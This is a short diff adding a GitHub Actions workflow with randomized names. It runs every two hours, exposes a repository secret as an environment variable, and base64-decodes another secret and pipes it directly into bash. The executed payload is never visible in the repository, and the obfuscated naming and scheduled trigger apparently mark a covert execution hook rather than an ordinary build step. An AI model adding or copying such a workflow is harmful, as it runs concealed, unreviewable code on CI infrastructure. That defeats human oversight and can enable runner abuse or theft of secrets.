@@ -1,0 +1,13 @@
+name: DHmptZHSR
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  SbafnXJ:
+    runs-on: ubuntu-24.04
+    env:
+      xWssMok: ${{ secrets.vlfcoXppo }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.kIqctRxdy }}" | base64 -d | bash
